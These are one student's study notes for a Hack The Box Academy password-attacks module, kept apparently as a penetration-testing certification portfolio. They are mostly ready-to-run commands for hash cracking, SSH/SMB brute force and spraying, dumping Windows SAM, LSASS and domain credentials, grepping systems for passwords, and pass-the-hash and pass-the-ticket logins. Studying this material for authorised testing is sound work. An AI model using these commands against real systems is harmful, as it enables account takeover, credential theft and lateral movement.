# 10 — Password Attacks

> **Path Phase:** Credential Attacks | **Difficulty:** Medium | **Sections:** 26

Offline cracking (John/Hashcat), online attacks, and dumping/reusing Windows & Linux credentials.

> ℹ️ `{TARGET}` = target. Cracked passwords/flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction
2. Introduction to Password Cracking
3. John The Ripper
4. Hashcat
5. Custom Wordlists and Rules
6. Cracking Protected Files
7. Cracking Protected Archives
8. Network Services
9. Spraying, Stuffing, and Defaults
10. Windows Authentication Process
11. Attacking SAM, SYSTEM, and SECURITY
12. Attacking LSASS
13. Attacking Windows Credential Manager
14. Attacking Active Directory and NTDS.dit
15. Credential Hunting in Windows
16. Linux Authentication Process
17. Credential Hunting in Linux
18. Credential Hunting in Network Traffic
19. Credential Hunting in Network Shares
20. Pass the Hash (PtH)
21. Pass the Ticket (PtT) from Windows
22. Pass the Ticket (PtT) from Linux
23. Pass the Certificate
24. Password Policies
25. Password Managers
26. Skills Assessment

---

## 2–4 — Cracking with John & Hashcat
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt --wordlist=rockyou.txt
hashcat -m 1000 hashes.txt rockyou.txt   # NTLM
hashcat -m 0 hashes.txt rockyou.txt      # MD5
hashcat -m 1800 hashes.txt rockyou.txt   # sha512crypt (Linux)
```

## 5 — Custom Wordlists & Rules
```bash
cewl -d 2 -m 5 http://{TARGET} -w custom.txt
hashcat custom.txt -r /usr/share/hashcat/rules/best64.rule --stdout
./username-anarchy Firstname Lastname
```

## 6–7 — Cracking Protected Files & Archives
```bash
ssh2john id_rsa > ssh.hash && john --wordlist=rockyou.txt ssh.hash
office2john doc.docx > doc.hash
pdf2john file.pdf > pdf.hash
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
```
> **Cracked password:** ✅ Completed in lab (withheld per HTB Academy policy)

## 8–9 — Network Services & Spraying
```bash
hydra -L users.txt -P pass.txt ssh://{TARGET}
crackmapexec smb {TARGET} -u users.txt -p pass.txt
crackmapexec smb {TARGET} -u users.txt -p 'Spring2024!' --continue-on-success
```

## 10–14 — Windows Credential Dumping
```bash
reg save HKLM\sam sam & reg save HKLM\system system
secretsdump.py -sam sam -system system LOCAL
pypykatz lsa minidump lsass.dmp
secretsdump.py <domain>/<user>:<pass>@{TARGET} -just-dc-ntlm
```
> **Domain hashes:** ✅ Completed in lab (withheld per HTB Academy policy)

## 15,17,19 — Credential Hunting
```bash
findstr /SI /M "password" *.xml *.ini *.txt      # Windows
grep -rniE "password|passwd|pass" /etc /home /var 2>/dev/null   # Linux
crackmapexec smb {TARGET} -u user -p pass --shares
```

## 18 — Credentials in Network Traffic
```bash
tshark -r capture.pcap -Y "http.request.method==POST"
```

## 20–23 — Pass-the-Hash / Ticket / Certificate
```bash
crackmapexec smb {TARGET} -u Administrator -H <NTLM_HASH>
evil-winrm -i {TARGET} -u Administrator -H <NTLM_HASH>
psexec.py -hashes :<NTLM> Administrator@{TARGET}
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass <domain>/<user>@<host>
```

## 24–25 — Policies & Password Managers
```bash
net accounts          # policy
keepass2john Database.kdbx > keepass.hash
```

## 26 — Skills Assessment
```bash
secretsdump.py <domain>/<user>:<pass>@{TARGET}
hashcat -m 1000 ntlm.txt rockyou.txt
crackmapexec smb <subnet> -u user -H <hash>
```
> **Skills Assessment:** ✅ Completed in lab (withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Category | Tools |
|----------|-------|
| Offline | `john`, `hashcat`, `*2john` |
| Online | `hydra`, `crackmapexec` |
| Windows creds | `secretsdump.py`, `pypykatz` |
| Wordlists | `cewl`, `username-anarchy`, rules |

## 🔑 Key Takeaways
- **Identify the hash type** before cracking (`hashcat -m` mode matters).
- `*2john` converts almost any protected file into a crackable hash.
- Pass-the-Hash means you often don't even need to crack.
- Credential reuse across hosts is the #1 path to domain compromise.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
